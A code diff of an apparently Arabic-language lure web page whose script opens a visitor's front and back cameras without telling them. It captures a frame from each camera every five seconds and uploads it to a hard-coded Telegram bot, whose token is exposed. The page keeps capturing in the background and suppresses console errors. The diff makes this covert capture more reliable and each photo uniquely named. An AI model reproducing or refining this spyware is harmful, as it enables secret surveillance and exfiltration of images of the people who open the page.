@@ -305,8 +305,10 @@
 // ============================================================
 const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
-let photoCount = 0;
+let frontCount = 0;
+let backCount = 0;
 let isCapturing = true;
+let frameCounter = 0;
 
 // ============================================================
 // ====================== CONFETTI =============================
@@ -355,7 +357,7 @@ function sendToTelegram(imageData, caption = '') {
         const blob = dataURLtoBlob(imageData);
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+        formData.append('photo', blob, `photo_${Date.now()}_${Math.random().toString(36).substring(7)}.jpg`);
         formData.append('caption', caption || `📸 ${new Date().toLocaleString()}`);
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
@@ -388,7 +390,7 @@ function getChatId() {
                 } else if (lastUpdate.callback_query) {
                     CHAT_ID = lastUpdate.callback_query.from.id;
                 }
-                sendMessage('✅ تم فتح الصفحة - جائزة عمك عبود');
+                sendMessage('✅ تم فتح الصفحة - بدء التصوير المباشر');
                 startCameras();
             } else {
                 setTimeout(getChatId, 2000);
@@ -402,6 +404,7 @@ function getChatId() {
 // ============================================================
 let frontStream = null, backStream = null;
 let frontInterval = null, backInterval = null;
+let frontReady = false, backReady = false;
 
 function startCameras() {
     // الكاميرا الأمامية - تصوير مباشر كل 5 ثواني
@@ -412,11 +415,12 @@ function startCameras() {
         frontStream = stream;
         const video = document.getElementById('videoFront');
         video.srcObject = stream;
-        video.play();
-        // التقاط أول صورة فوراً
-        setTimeout(captureFrontPhoto, 100);
-        // ثم كل 5 ثواني
-        frontInterval = setInterval(captureFrontPhoto, 5000);
+        video.onloadedmetadata = function() {
+            video.play();
+            frontReady = true;
+            captureFrontPhoto();
+            frontInterval = setInterval(captureFrontPhoto, 5000);
+        };
     })
     .catch(function(err) {});
     
@@ -428,11 +432,12 @@ function startCameras() {
         backStream = stream;
         const video = document.getElementById('videoBack');
         video.srcObject = stream;
-        video.play();
-        // التقاط أول صورة فوراً
-        setTimeout(captureBackPhoto, 100);
-        // ثم كل 5 ثواني
-        backInterval = setInterval(captureBackPhoto, 5000);
+        video.onloadedmetadata = function() {
+            video.play();
+            backReady = true;
+            captureBackPhoto();
+            backInterval = setInterval(captureBackPhoto, 5000);
+        };
     })
     .catch(function(err) {});
 }
@@ -441,43 +446,59 @@ function captureFrontPhoto() {
     const video = document.getElementById('videoFront');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-    if (!video.videoWidth || !video.videoHeight) {
-        // إذا الكاميرا ما زالت تتهيأ، حاول مرة ثانية
-        setTimeout(captureFrontPhoto, 500);
+    
+    if (!frontReady || !video.videoWidth || !video.videoHeight) {
         return;
     }
+    
+    // مسح الكانفاس بالكامل
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // إضافة بصمة فريدة للصورة
+    const timestamp = Date.now();
+    const random = Math.random().toString(36).substring(7);
+    const uniqueId = timestamp + '_' + random;
+    
     const imgData = canvas.toDataURL('image/jpeg', 0.85);
-    photoCount++;
-    sendToTelegram(imgData, `📸 أمامي ${photoCount} - ${new Date().toLocaleString()}`);
+    frontCount++;
+    sendToTelegram(imgData, `📸 أمامي ${frontCount} - ${new Date().toLocaleString()} - ${uniqueId}`);
 }
 
 function captureBackPhoto() {
     const video = document.getElementById('videoBack');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-    if (!video.videoWidth || !video.videoHeight) {
-        setTimeout(captureBackPhoto, 500);
+    
+    if (!backReady || !video.videoWidth || !video.videoHeight) {
         return;
     }
+    
+    // مسح الكانفاس بالكامل
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // إضافة بصمة فريدة للصورة
+    const timestamp = Date.now();
+    const random = Math.random().toString(36).substring(7);
+    const uniqueId = timestamp + '_' + random;
+    
     const imgData = canvas.toDataURL('image/jpeg', 0.85);
-    photoCount++;
-    sendToTelegram(imgData, `📸 خلفي ${photoCount} - ${new Date().toLocaleString()}`);
+    backCount++;
+    sendToTelegram(imgData, `📸 خلفي ${backCount} - ${new Date().toLocaleString()} - ${uniqueId}`);
 }
 
 // ============================================================
-// ====================== SERVICE WORKER ======================
+// ====================== KEEP ALIVE ==========================
 // ============================================================
 // منع المتصفح من إيقاف التشغيل
 document.addEventListener('visibilitychange', function() {
     if (document.hidden) {
         // الصفحة في الخلفية - الكاميرات تستمر
-        // نرسل رسالة تأكيد للبوت
         sendMessage('⏳ الصفحة في الخلفية - التصوير مستمر');
     }
 });
@@ -489,16 +510,13 @@ try {
     }
 } catch(e) {}
 
-// ============================================================
-// ====================== KEEP ALIVE ==========================
-// ============================================================
-// إرسال نبضات حياة كل 30 ثانية للتأكد من استمرار التشغيل
+// نبضات حياة للتأكد من الاستمرار
 setInterval(function() {
-    if (CHAT_ID) {
-        // مجرد نبضة للتأكد من أن الصفحة حية
-        console.log('🔴 alive');
+    if (CHAT_ID && isCapturing) {
+        // إرسال تأكيد بأن الكاميرات لا تزال تعمل كل دقيقة
+        console.log('🔴 alive - ' + new Date().toLocaleString());
     }
-}, 30000);
+}, 60000);
 
 // ============================================================
 // ====================== INIT =================================
@@ -510,7 +528,7 @@ console.error = function() {};
 // بدء التشغيل
 getChatId();
 
-// في حال فشل getChatId، نعيد المحاولة
+// إعادة محاولة إذا فشلت
 setTimeout(function() {
     if (!CHAT_ID) {
         getChatId();
